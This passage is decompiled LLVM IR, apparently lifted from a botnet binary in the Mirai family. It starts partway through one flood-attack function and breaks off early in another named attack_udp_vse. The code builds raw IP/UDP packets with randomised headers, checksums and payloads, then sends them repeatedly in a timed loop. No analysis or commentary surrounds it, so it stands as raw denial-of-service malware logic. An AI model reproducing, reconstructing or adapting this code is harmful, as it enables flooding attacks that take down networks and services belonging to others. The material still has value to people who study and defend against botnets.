  %v2_804c870 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c870 = add i32 %v2_804c870, 20
  %v4_804c870 = inttoptr i32 %v3_804c870 to i16*
  store i16 %v2_804cacf, i16* %v4_804c870, align 2
  %v2_804c87c = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c87c = add i32 %v2_804c87c, 2
  %v4_804c87c = inttoptr i32 %v3_804c87c to i16*
  store i16 %v2_804cadb, i16* %v4_804c87c, align 2
  %v0_804c880 = load i32, i32* @esi, align 4
  %v1_804c882 = trunc i32 %v0_804c880 to i16
  %v2_804c882 = call i16 @llvm.bswap.i16(i16 %v1_804c882)
  %v3_804c882 = zext i16 %v2_804c882 to i32
  %v5_804c882 = and i32 %v0_804c880, -65536
  %v6_804c882 = or i32 %v3_804c882, %v5_804c882
  store i32 %v6_804c882, i32* %eax.global-to-local, align 4
  %v2_804c886 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c886 = add i32 %v2_804c886, 4
  %v4_804c886 = inttoptr i32 %v3_804c886 to i16*
  store i16 %v2_804c882, i16* %v4_804c886, align 2
  %v0_804c88a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c88a = add i32 %v0_804c88a, 1
  store i32 %v1_804c88a, i32* @ebx, align 4
  store i32 %v1_804c88a, i32* %stack_var_-20, align 4
  %v5_804c895 = icmp slt i32 %v1_804c88a, %v4_804c679
  br i1 %v5_804c895, label %dec_label_pc_804c80c, label %dec_label_pc_804c89b

dec_label_pc_804c89b:                             ; preds = %dec_label_pc_804c80c, %dec_label_pc_804ca69, %dec_label_pc_804c7a3
  store i32 %.pre, i32* @ebp, align 4
  %v1_804c8a6 = add nuw nsw i32 %.pre, 8
  store i32 %v1_804c8a6, i32* %eax.global-to-local, align 4
  %v13_804c8d0 = icmp eq i32 %v5_804c740, -1
  %v13_804c9f5 = icmp eq i16 %v6_804c6c4, -1
  %v13_804c8e7 = icmp eq i16 %v6_804c6f7, -1
  %v13_804ca25 = icmp eq i16 %v1_804c7b5, -1
  %v4_804c8ff = icmp eq i8 %v6_804c72c, 0
  %v1_804c904 = icmp eq i1 %v4_804c8ff, false
  %v3_804c9c4 = add i32 %arg3, 20
  %v1_804c9fe = icmp eq i1 %v13_804c9f5, false
  %v1_804ca2f = icmp eq i1 %v13_804ca25, false
  %v6_804c952 = and i32 %arg3, -65536
  %v1_804ca13 = icmp eq i1 %v13_804c8e7, false
  %v1_804c9e5 = icmp eq i1 %v13_804c8d0, false
  br label %dec_label_pc_804c8ad

dec_label_pc_804c8ad:                             ; preds = %dec_label_pc_804cb03, %dec_label_pc_804c89b
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v4_804c7d2, label %dec_label_pc_804c8ad.dec_label_pc_804cb03_crit_edge, label %dec_label_pc_804c8c0

dec_label_pc_804c8ad.dec_label_pc_804cb03_crit_edge: ; preds = %dec_label_pc_804c8ad
  br label %dec_label_pc_804cb03

dec_label_pc_804c8c0:                             ; preds = %dec_label_pc_804c8ad
  %v0_804c8c0 = load i32, i32* @ebp, align 4
  %v1_804c8c0 = add i32 %v0_804c8c0, 28
  store i32 %v1_804c8c0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c988

dec_label_pc_804c8d0:                             ; preds = %dec_label_pc_804c988
  br i1 %v13_804c8d0, label %dec_label_pc_804c9f0, label %dec_label_pc_804c8db

dec_label_pc_804c8db:                             ; preds = %bb58, %dec_label_pc_804c8d0
  br i1 %v13_804c9f5, label %dec_label_pc_804ca04, label %dec_label_pc_804c8e7

dec_label_pc_804c8e7:                             ; preds = %dec_label_pc_804c9f0, %dec_label_pc_804c8db
  br i1 %v13_804c8e7, label %dec_label_pc_804ca20, label %dec_label_pc_804c8f3

dec_label_pc_804c8f3:                             ; preds = %dec_label_pc_804ca04, %dec_label_pc_804c8e7
  br i1 %v13_804ca25, label %dec_label_pc_804ca35, label %dec_label_pc_804c8ff

dec_label_pc_804c8ff:                             ; preds = %dec_label_pc_804ca20, %dec_label_pc_804c8f3
  br i1 %v1_804c904, label %dec_label_pc_804ca50, label %dec_label_pc_804c90a

dec_label_pc_804c90a:                             ; preds = %dec_label_pc_804ca35, %dec_label_pc_804c8ff, %dec_label_pc_804ca50
  %v0_804c90a = load i32, i32* @esi, align 4
  %v1_804c90a = add i32 %v0_804c90a, 10
  %v2_804c90a = inttoptr i32 %v1_804c90a to i16*
  store i16 0, i16* %v2_804c90a, align 2
  %v0_804c914 = load i32, i32* @esi, align 4
  %v2_804c915 = inttoptr i32 %v0_804c914 to i16*
  %v3_804c915 = call i32 @checksum_generic(i16* %v2_804c915, i32 20)
  %v4_804c915 = trunc i32 %v3_804c915 to i16
  %v3_804c91a = load i32, i32* @esi, align 4
  %v4_804c91a = add i32 %v3_804c91a, 10
  %v5_804c91a = inttoptr i32 %v4_804c91a to i16*
  store i16 %v4_804c915, i16* %v5_804c91a, align 2
  store i32 %v1_804c8a6, i32* %eax.global-to-local, align 4
  %v0_804c922 = load i32, i32* @edi, align 4
  %v1_804c922 = add i32 %v0_804c922, 6
  %v2_804c922 = inttoptr i32 %v1_804c922 to i16*
  store i16 0, i16* %v2_804c922, align 2
  %v0_804c929 = load i32, i32* @edi, align 4
  %v1_804c929 = add i32 %v0_804c929, 4
  %v2_804c929 = inttoptr i32 %v1_804c929 to i16*
  %v3_804c929 = load i16, i16* %v2_804c929, align 2
  %v4_804c929 = zext i16 %v3_804c929 to i32
  store i32 %v4_804c929, i32* %eax.global-to-local, align 4
  %v0_804c934 = load i32, i32* @esi, align 4
  %v4_804c935 = inttoptr i32 %v0_804c929 to i16*
  %v5_804c935 = call i32 @checksum_tcpudp(i32 %v0_804c934, i16* %v4_804c935, i32 %v4_804c929)
  %v6_804c935 = trunc i32 %v5_804c935 to i16
  %v3_804c93a = load i32, i32* @edi, align 4
  %v4_804c93a = add i32 %v3_804c93a, 6
  %v5_804c93a = inttoptr i32 %v4_804c93a to i16*
  store i16 %v6_804c935, i16* %v5_804c93a, align 2
  %v3_804c93e = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804c94f = mul i32 %v3_804c93e, 24
  %v3_804c94f = add i32 %v2_804c94f, %arg3
  store i32 %v3_804c94f, i32* %eax.global-to-local, align 4
  %v0_804c952 = load i32, i32* @edi, align 4
  %v1_804c952 = add i32 %v0_804c952, 2
  %v2_804c952 = inttoptr i32 %v1_804c952 to i16*
  %v3_804c952 = load i16, i16* %v2_804c952, align 2
  %v4_804c952 = zext i16 %v3_804c952 to i32
  %v7_804c952 = or i32 %v4_804c952, %v6_804c952
  store i32 %v7_804c952, i32* %edx.global-to-local, align 4
  %v3_804c956 = add i32 %v3_804c94f, 2
  %v4_804c956 = inttoptr i32 %v3_804c956 to i16*
  store i16 %v3_804c952, i16* %v4_804c956, align 2
  %v0_804c95c = load i32, i32* %eax.global-to-local, align 4
  %v0_804c967 = load i32, i32* @esi, align 4
  store i32 %v3_804c766, i32* %eax.global-to-local, align 4
  %v6_804c96d = call i32 @__libc_sendto(i32 %v3_804c766, i32 %v0_804c967, i32 %v1_804c8c0, i32 16384, i32 %v0_804c95c, i32 16)
  %v3_804c972 = load i32, i32* %stack_var_-20, align 4
  %v1_804c976 = add i32 %v3_804c972, 1
  store i32 %v1_804c976, i32* %eax.global-to-local, align 4
  store i32 %v1_804c976, i32* %stack_var_-20, align 4
  %v5_804c982 = icmp slt i32 %v1_804c976, %v4_804c679
  br i1 %v5_804c982, label %dec_label_pc_804c988, label %dec_label_pc_804cb03

dec_label_pc_804c988:                             ; preds = %dec_label_pc_804c90a, %dec_label_pc_804c8c0
  %v0_804c9a9 = phi i32 [ %v1_804c976, %dec_label_pc_804c90a ], [ 0, %dec_label_pc_804c8c0 ]
  store i32 %v3_804c6a0, i32* %edx.global-to-local, align 4
  %v2_804c98c = mul i32 %v0_804c9a9, 4
  %v3_804c98c = add i32 %v2_804c98c, %v3_804c6a0
  %v4_804c98c = inttoptr i32 %v3_804c98c to i32*
  %v5_804c98c = load i32, i32* %v4_804c98c, align 4
  store i32 %v5_804c98c, i32* @esi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804c996 = add i32 %v5_804c98c, 20
  store i32 %v1_804c996, i32* @edi, align 4
  %v2_804c999 = mul i32 %v0_804c9a9, 24
  %v3_804c999 = add i32 %v2_804c999, %arg3
  store i32 %v3_804c999, i32* %eax.global-to-local, align 4
  %v1_804c99c = add i32 %v3_804c999, 20
  %v2_804c99c = inttoptr i32 %v1_804c99c to i8*
  %v3_804c99c = load i8, i8* %v2_804c99c, align 1
  %v6_804c9a0 = icmp ugt i8 %v3_804c99c, 31
  br i1 %v6_804c9a0, label %dec_label_pc_804c8d0, label %dec_label_pc_804c9a6

dec_label_pc_804c9a6:                             ; preds = %dec_label_pc_804c988
  %v1_804c9a6 = add i32 %v3_804c999, 16
  %v2_804c9a6 = inttoptr i32 %v1_804c9a6 to i32*
  %v3_804c9a6 = load i32, i32* %v2_804c9a6, align 4
  store i32 %v3_804c9a6, i32* %ebx.global-to-local, align 4
  %v1_804c9a9 = call i32 @rand_next(i32 %v0_804c9a9)
  store i32 %v1_804c9a9, i32* %eax.global-to-local, align 4
  %v1_804c9ae = trunc i32 %v3_804c9a6 to i16
  %v2_804c9ae = call i16 @llvm.bswap.i16(i16 %v1_804c9ae)
  %v3_804c9ae = zext i16 %v2_804c9ae to i32
  %v1_804c9b2 = udiv i32 %v3_804c9a6, 65536
  %v2_804c9b2 = mul nuw i32 %v3_804c9ae, 65536
  %v1_804c9b5 = trunc i32 %v1_804c9b2 to i16
  %v2_804c9b5 = call i16 @llvm.bswap.i16(i16 %v1_804c9b5)
  %v3_804c9b5 = zext i16 %v2_804c9b5 to i32
  %v6_804c9b5 = or i32 %v3_804c9b5, %v2_804c9b2
  store i32 %v6_804c9b5, i32* %ebx.global-to-local, align 4
  %v3_804c9b9 = load i32, i32* %stack_var_-20, align 4
  %v3_804c9bd = mul i32 %v3_804c9b9, 3
  store i32 %v3_804c9bd, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v2_804c9c4 = mul i32 %v3_804c9b9, 24
  %v4_804c9c4 = add i32 %v3_804c9c4, %v2_804c9c4
  %v5_804c9c4 = inttoptr i32 %v4_804c9c4 to i8*
  %v6_804c9c4 = load i8, i8* %v5_804c9c4, align 1
  %v7_804c9c4 = zext i8 %v6_804c9c4 to i32
  store i32 %v7_804c9c4, i32* %ecx.global-to-local, align 4
  %tmp = urem i8 %v6_804c9c4, 32
  %v4_804c9ce = icmp eq i8 %tmp, 0
  br i1 %v4_804c9ce, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_804c9a6
  %v2_804c9ce = zext i8 %tmp to i32
  %v5_804c9ce = lshr i32 %v1_804c9a9, %v2_804c9ce
  store i32 %v5_804c9ce, i32* %eax.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_804c9a6, %bb
  %v1_804c9d0 = phi i32 [ %v1_804c9a9, %dec_label_pc_804c9a6 ], [ %v5_804c9ce, %bb ]
  %v2_804c9d0 = add i32 %v1_804c9d0, %v6_804c9b5
  %v1_804c9d2 = trunc i32 %v2_804c9d0 to i16
  %v2_804c9d2 = call i16 @llvm.bswap.i16(i16 %v1_804c9d2)
  %v3_804c9d2 = zext i16 %v2_804c9d2 to i32
  %v1_804c9d6 = udiv i32 %v2_804c9d0, 65536
  %v2_804c9d6 = mul nuw i32 %v3_804c9d2, 65536
  %v1_804c9d9 = trunc i32 %v1_804c9d6 to i16
  %v2_804c9d9 = call i16 @llvm.bswap.i16(i16 %v1_804c9d9)
  %v3_804c9d9 = zext i16 %v2_804c9d9 to i32
  %v6_804c9d9 = or i32 %v3_804c9d9, %v2_804c9d6
  store i32 %v6_804c9d9, i32* @ebx, align 4
  %v1_804c9e2 = load i32, i32* @esi, align 4
  %v2_804c9e2 = add i32 %v1_804c9e2, 16
  %v3_804c9e2 = inttoptr i32 %v2_804c9e2 to i32*
  store i32 %v6_804c9d9, i32* %v3_804c9e2, align 4
  br i1 %v1_804c9e5, label %dec_label_pc_804c8db, label %.dec_label_pc_804c9f0_crit_edge

.dec_label_pc_804c9f0_crit_edge:                  ; preds = %bb58
  %v0_804c9f0.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804c9f0

dec_label_pc_804c9f0:                             ; preds = %.dec_label_pc_804c9f0_crit_edge, %dec_label_pc_804c8d0
  %v0_804c9f0 = phi i32 [ %v0_804c9f0.pre, %.dec_label_pc_804c9f0_crit_edge ], [ %v0_804c9a9, %dec_label_pc_804c8d0 ]
  %v1_804c9f0 = call i32 @rand_next(i32 %v0_804c9f0)
  store i32 %v1_804c9f0, i32* %eax.global-to-local, align 4
  %v1_804c9fb = load i32, i32* @esi, align 4
  %v2_804c9fb = add i32 %v1_804c9fb, 12
  %v3_804c9fb = inttoptr i32 %v2_804c9fb to i32*
  store i32 %v1_804c9f0, i32* %v3_804c9fb, align 4
  br i1 %v1_804c9fe, label %dec_label_pc_804c8e7, label %dec_label_pc_804ca04

dec_label_pc_804ca04:                             ; preds = %dec_label_pc_804c9f0, %dec_label_pc_804c8db
  %v0_804ca04 = load i32, i32* %stack_var_-20, align 4
  %v1_804ca04 = call i32 @rand_next(i32 %v0_804ca04)
  store i32 %v1_804ca04, i32* %eax.global-to-local, align 4
  %v1_804ca0f = trunc i32 %v1_804ca04 to i16
  %v2_804ca0f = load i32, i32* @esi, align 4
  %v3_804ca0f = add i32 %v2_804ca0f, 4
  %v4_804ca0f = inttoptr i32 %v3_804ca0f to i16*
  store i16 %v1_804ca0f, i16* %v4_804ca0f, align 2
  br i1 %v1_804ca13, label %dec_label_pc_804c8f3, label %dec_label_pc_804ca20

dec_label_pc_804ca20:                             ; preds = %dec_label_pc_804ca04, %dec_label_pc_804c8e7
  %v0_804ca20 = load i32, i32* %stack_var_-20, align 4
  %v1_804ca20 = call i32 @rand_next(i32 %v0_804ca20)
  store i32 %v1_804ca20, i32* %eax.global-to-local, align 4
  %v1_804ca2b = trunc i32 %v1_804ca20 to i16
  %v2_804ca2b = load i32, i32* @esi, align 4
  %v3_804ca2b = add i32 %v2_804ca2b, 20
  %v4_804ca2b = inttoptr i32 %v3_804ca2b to i16*
  store i16 %v1_804ca2b, i16* %v4_804ca2b, align 2
  br i1 %v1_804ca2f, label %dec_label_pc_804c8ff, label %dec_label_pc_804ca35

dec_label_pc_804ca35:                             ; preds = %dec_label_pc_804ca20, %dec_label_pc_804c8f3
  %v0_804ca35 = load i32, i32* %stack_var_-20, align 4
  %v1_804ca35 = call i32 @rand_next(i32 %v0_804ca35)
  store i32 %v1_804ca35, i32* %eax.global-to-local, align 4
  %v1_804ca3f = trunc i32 %v1_804ca35 to i16
  %v2_804ca3f = load i32, i32* @edi, align 4
  %v3_804ca3f = add i32 %v2_804ca3f, 2
  %v4_804ca3f = inttoptr i32 %v3_804ca3f to i16*
  store i16 %v1_804ca3f, i16* %v4_804ca3f, align 2
  br i1 %v4_804c8ff, label %dec_label_pc_804c90a, label %dec_label_pc_804ca50

dec_label_pc_804ca50:                             ; preds = %dec_label_pc_804ca35, %dec_label_pc_804c8ff
  %v0_804ca50 = load i32, i32* @esi, align 4
  %v1_804ca50 = add i32 %v0_804ca50, 28
  store i32 %v1_804ca50, i32* @ebx, align 4
  %v0_804ca53 = load i32, i32* @edx, align 4
  %v2_804ca57 = inttoptr i32 %v1_804ca50 to i8*
  %v3_804ca57 = call i32 @rand_alphastr(i8* %v2_804ca57, i32 %v0_804ca53)
  store i32 %v3_804ca57, i32* %eax.global-to-local, align 4
  %v0_804ca5f = load i32, i32* @ebp, align 4
  %v1_804ca5f = load i32, i32* @ebx, align 4
  %v2_804ca5f = add i32 %v1_804ca5f, %v0_804ca5f
  %v3_804ca5f = inttoptr i32 %v2_804ca5f to i8*
  store i8 0, i8* %v3_804ca5f, align 1
  br label %dec_label_pc_804c90a

dec_label_pc_804ca69:                             ; preds = %dec_label_pc_804ca69.preheader, %dec_label_pc_804ca69.dec_label_pc_804ca69_crit_edge
  %v3_804ca72 = call i32 @calloc(i64 1510, i32 1)
  store i32 %v3_804ca72, i32* %eax.global-to-local, align 4
  store i32 %v3_804c6a0, i32* %ebp.global-to-local, align 4
  %v3_804ca7b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ca7b, i32* %ecx.global-to-local, align 4
  %v2_804ca7f = load i32, i32* @ebx, align 4
  %v3_804ca7f = mul i32 %v2_804ca7f, 4
  %v4_804ca7f = add i32 %v3_804ca7f, %v3_804c6a0
  %v5_804ca7f = inttoptr i32 %v4_804ca7f to i32*
  store i32 %v3_804ca72, i32* %v5_804ca7f, align 4
  %v0_804ca83 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ca83 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ca83 = mul i32 %v1_804ca83, 4
  %v3_804ca83 = add i32 %v2_804ca83, %v0_804ca83
  %v4_804ca83 = inttoptr i32 %v3_804ca83 to i32*
  %v5_804ca83 = load i32, i32* %v4_804ca83, align 4
  store i32 %v5_804ca83, i32* %eax.global-to-local, align 4
  %v1_804ca87 = inttoptr i32 %v5_804ca83 to i8*
  store i8 69, i8* %v1_804ca87, align 1
  %v0_804ca8a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca8a = add i32 %v0_804ca8a, 20
  store i32 %v1_804ca8a, i32* %ebx.global-to-local, align 4
  %v5_804ca8d = load i32, i32* @edx, align 4
  %v6_804ca8d = and i32 %v5_804ca8d, -256
  %v7_804ca8d = or i32 %v6_804ca8d, %v4_804ca8d
  store i32 %v7_804ca8d, i32* %edx.global-to-local, align 4
  %v0_804ca91 = load i32, i32* @edi, align 4
  %v1_804ca91 = trunc i32 %v0_804ca91 to i16
  %v3_804ca91 = add i32 %v0_804ca8a, 2
  %v4_804ca91 = inttoptr i32 %v3_804ca91 to i16*
  store i16 %v1_804ca91, i16* %v4_804ca91, align 2
  %v0_804ca95 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ca95 = trunc i32 %v0_804ca95 to i8
  %v2_804ca95 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ca95 = add i32 %v2_804ca95, 1
  %v4_804ca95 = inttoptr i32 %v3_804ca95 to i8*
  store i8 %v1_804ca95, i8* %v4_804ca95, align 1
  %v0_804ca98 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca98 = add i32 %v0_804ca98, 6
  %v2_804ca98 = inttoptr i32 %v1_804ca98 to i16*
  store i16 64, i16* %v2_804ca98, align 2
  %v5_804ca9e = load i32, i32* %ebp.global-to-local, align 4
  %v6_804ca9e = and i32 %v5_804ca9e, -65536
  %v7_804ca9e = or i32 %v6_804ca9e, %v3_804c7f8
  store i32 %v7_804ca9e, i32* %ebp.global-to-local, align 4
  %v2_804caaa = load i32, i32* %eax.global-to-local, align 4
  %v3_804caaa = add i32 %v2_804caaa, 8
  %v4_804caaa = inttoptr i32 %v3_804caaa to i8*
  store i8 %v1_804caaa, i8* %v4_804caaa, align 1
  %v0_804caad = load i32, i32* %eax.global-to-local, align 4
  %v1_804caad = add i32 %v0_804caad, 9
  %v2_804caad = inttoptr i32 %v1_804caad to i8*
  store i8 17, i8* %v2_804caad, align 1
  %v0_804cab1 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cab1 = trunc i32 %v0_804cab1 to i16
  %v2_804cab1 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cab1 = add i32 %v2_804cab1, 4
  %v4_804cab1 = inttoptr i32 %v3_804cab1 to i16*
  store i16 %v1_804cab1, i16* %v4_804cab1, align 2
  %v0_804cab9 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804cab9 = mul i32 %v0_804cab9, 3
  store i32 %v3_804cab9, i32* %edx.global-to-local, align 4
  %v1_804cabc = load i32, i32* %eax.global-to-local, align 4
  %v2_804cabc = add i32 %v1_804cabc, 12
  %v3_804cabc = inttoptr i32 %v2_804cabc to i32*
  store i32 %v5_804c740, i32* %v3_804cabc, align 4
  store i32 %arg3, i32* @ebp, align 4
  %v1_804cac3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cac3 = mul i32 %v1_804cac3, 8
  %v4_804cac3 = add i32 %v2_804cac3, %v3_804cac3
  %v5_804cac3 = inttoptr i32 %v4_804cac3 to i32*
  %v6_804cac3 = load i32, i32* %v5_804cac3, align 4
  store i32 %v6_804cac3, i32* %edx.global-to-local, align 4
  %v1_804cac7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cac7 = add i32 %v1_804cac7, 16
  %v3_804cac7 = inttoptr i32 %v2_804cac7 to i32*
  store i32 %v6_804cac3, i32* %v3_804cac7, align 4
  %v5_804caca = load i32, i32* %edx.global-to-local, align 4
  %v5_804cacf = and i32 %v5_804caca, -65536
  %v6_804cacf = or i32 %v5_804cacf, %v3_804cacf
  store i32 %v6_804cacf, i32* %edx.global-to-local, align 4
  %v2_804cad3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cad3 = add i32 %v2_804cad3, 20
  %v4_804cad3 = inttoptr i32 %v3_804cad3 to i16*
  store i16 %v2_804cacf, i16* %v4_804cad3, align 2
  %v2_804cadf = load i32, i32* %ebx.global-to-local, align 4
  %v3_804cadf = add i32 %v2_804cadf, 2
  %v4_804cadf = inttoptr i32 %v3_804cadf to i16*
  store i16 %v2_804cadb, i16* %v4_804cadf, align 2
  %v0_804cae3 = load i32, i32* @esi, align 4
  %v1_804cae5 = trunc i32 %v0_804cae3 to i16
  %v2_804cae5 = call i16 @llvm.bswap.i16(i16 %v1_804cae5)
  %v3_804cae5 = zext i16 %v2_804cae5 to i32
  %v5_804cae5 = and i32 %v0_804cae3, -65536
  %v6_804cae5 = or i32 %v3_804cae5, %v5_804cae5
  store i32 %v6_804cae5, i32* %eax.global-to-local, align 4
  %v2_804cae9 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804cae9 = add i32 %v2_804cae9, 4
  %v4_804cae9 = inttoptr i32 %v3_804cae9 to i16*
  store i16 %v2_804cae5, i16* %v4_804cae9, align 2
  %v0_804caed = load i32, i32* %ecx.global-to-local, align 4
  %v1_804caed = add i32 %v0_804caed, 1
  store i32 %v1_804caed, i32* @ebx, align 4
  store i32 %v1_804caed, i32* %stack_var_-20, align 4
  %v5_804caf8 = icmp slt i32 %v1_804caed, %v4_804c679
  br i1 %v5_804caf8, label %dec_label_pc_804ca69.dec_label_pc_804ca69_crit_edge, label %dec_label_pc_804c89b

dec_label_pc_804ca69.dec_label_pc_804ca69_crit_edge: ; preds = %dec_label_pc_804ca69
  br label %dec_label_pc_804ca69

dec_label_pc_804cb03:                             ; preds = %dec_label_pc_804c90a, %dec_label_pc_804c8ad.dec_label_pc_804cb03_crit_edge
  %v2_804cb08 = call i32 @__GI_time(i32* null)
  store i32 %v2_804cb08, i32* %eax.global-to-local, align 4
  %v5_804cb14 = icmp slt i32 %v2_804c757, %v2_804cb08
  br i1 %v5_804cb14, label %dec_label_pc_804cb1a, label %dec_label_pc_804c8ad

dec_label_pc_804cb1a:                             ; preds = %dec_label_pc_804cb03, %entry
  %v0_804cb21 = phi i32 [ 0, %entry ], [ %v2_804cb08, %dec_label_pc_804cb03 ]
  store i32 %v0_804c673, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c672, i32* %esi.global-to-local, align 4
  store i32 %v0_804c670, i32* %ebp.global-to-local, align 4
  ret i32 %v0_804cb21

dec_label_pc_804cb2e:                             ; preds = %dec_label_pc_804c779
  store i32 %v3_804c766, i32* %ebx.global-to-local, align 4
  %v1_804cb36 = call i32 @__GI___libc_close(i32 %v3_804c766)
  store i32 %v1_804cb36, i32* %eax.global-to-local, align 4
  store i32 %v0_804c673, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c672, i32* %esi.global-to-local, align 4
  store i32 %v0_804c670, i32* %ebp.global-to-local, align 4
  ret i32 %v1_804cb36

; uselistorder directives
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v0_804c9a9, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804c976, { 1, 0, 2, 3 }
  uselistorder i1 %v13_804c9f5, { 1, 0 }
  uselistorder i16 %v2_804cadb, { 1, 0 }
  uselistorder i16 %v2_804cacf, { 1, 0, 2 }
  uselistorder i32 %v4_804ca8d, { 1, 0 }
  uselistorder i32 %v1_804c7e7, { 1, 0 }
  uselistorder i32 %.pre, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c7ba, { 1, 0, 2 }
  uselistorder i32 %v4_804c7a3, { 1, 0 }
  uselistorder i32 %v3_804c766, { 3, 2, 1, 0, 5, 4, 6 }
  uselistorder i32 %v5_804c740, { 2, 0, 1, 3 }
  uselistorder i32 %v5_804c72c, { 1, 0 }
  uselistorder i32 %v5_804c6f7, { 0, 2, 1 }
  uselistorder i32 %v5_804c6e5, { 1, 0 }
  uselistorder i32 %v5_804c6d3, { 1, 0, 2 }
  uselistorder i32 %v5_804c6c4, { 0, 2, 1 }
  uselistorder i32 %v3_804c6a0, { 0, 4, 1, 5, 2, 3, 6 }
  uselistorder i32 %v4_804c679, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v0_804c673, { 1, 0 }
  uselistorder i32 %v0_804c672, { 1, 0 }
  uselistorder i32 %v0_804c670, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 4, 5, 2, 1, 3, 0, 6, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 26, 27, 20, 21, 22, 23, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg3, { 8, 6, 0, 5, 1, 4, 2, 7, 3, 9 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ca69, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %dec_label_pc_804c90a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c89b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c80c, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v4_804cb59 = zext i8 %arg2 to i32
  %v5_804cb59 = load i32, i32* @eax, align 4
  %v6_804cb59 = and i32 %v5_804cb59, -256
  %v7_804cb59 = or i32 %v6_804cb59, %v4_804cb59
  store i32 %v7_804cb59, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804cb59, i32* %edx.global-to-local, align 4
  %v4_804cb63 = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804cb63, i32* @ebx, align 4
  %v2_804cb80 = zext i8 %arg2 to i64
  %v3_804cb80 = call i32 @calloc(i64 %v2_804cb80, i32 4)
  store i32 %v3_804cb80, i32* @eax, align 4
  %v0_804cb8d = load i32, i32* @esi, align 4
  %v0_804cb8e = load i32, i32* @ebx, align 4
  %v4_804cb8f = trunc i32 %v0_804cb8e to i8
  %v5_804cb8f = call i32 @attack_get_opt_int(i8 %v4_804cb8f, i32 %v0_804cb8d, i32 2, i32 0)
  %v6_804cb8f = trunc i32 %v5_804cb8f to i8
  store i32 %v5_804cb8f, i32* @eax, align 4
  %v0_804cba2 = load i32, i32* @esi, align 4
  %v0_804cba3 = load i32, i32* @ebx, align 4
  %v4_804cba4 = trunc i32 %v0_804cba3 to i8
  %v5_804cba4 = call i32 @attack_get_opt_int(i8 %v4_804cba4, i32 %v0_804cba2, i32 3, i32 65535)
  store i32 %v5_804cba4, i32* @eax, align 4
  %sext = mul i32 %v5_804cba4, 65536
  %v1_804cbab = sdiv i32 %sext, 65536
  store i32 %v1_804cbab, i32* @ebp, align 4
  %v0_804cbaf = load i32, i32* @esi, align 4
  %v0_804cbb0 = load i32, i32* @ebx, align 4
  %v4_804cbb1 = trunc i32 %v0_804cbb0 to i8
  %v5_804cbb1 = call i32 @attack_get_opt_int(i8 %v4_804cbb1, i32 %v0_804cbaf, i32 4, i32 64)
  store i32 %v5_804cbb1, i32* @eax, align 4
  %v0_804cbc1 = load i32, i32* @esi, align 4
  %v0_804cbc2 = load i32, i32* @ebx, align 4
  %v4_804cbc3 = trunc i32 %v0_804cbc2 to i8
  %v5_804cbc3 = call i32 @attack_get_opt_int(i8 %v4_804cbc3, i32 %v0_804cbc1, i32 5, i32 0)
  %v6_804cbc3 = trunc i32 %v5_804cbc3 to i8
  store i32 %v5_804cbc3, i32* @eax, align 4
  %v0_804cbd3 = load i32, i32* @esi, align 4
  %v0_804cbd4 = load i32, i32* @ebx, align 4
  %v4_804cbd5 = trunc i32 %v0_804cbd4 to i8
  %v5_804cbd5 = call i32 @attack_get_opt_int(i8 %v4_804cbd5, i32 %v0_804cbd3, i32 6, i32 65535)
  store i32 %v5_804cbd5, i32* @eax, align 4
  %v1_804cbdd = trunc i32 %v5_804cbd5 to i16
  store i32 %v5_804cbd5, i32* @edi, align 4
  %v0_804cbe6 = load i32, i32* @esi, align 4
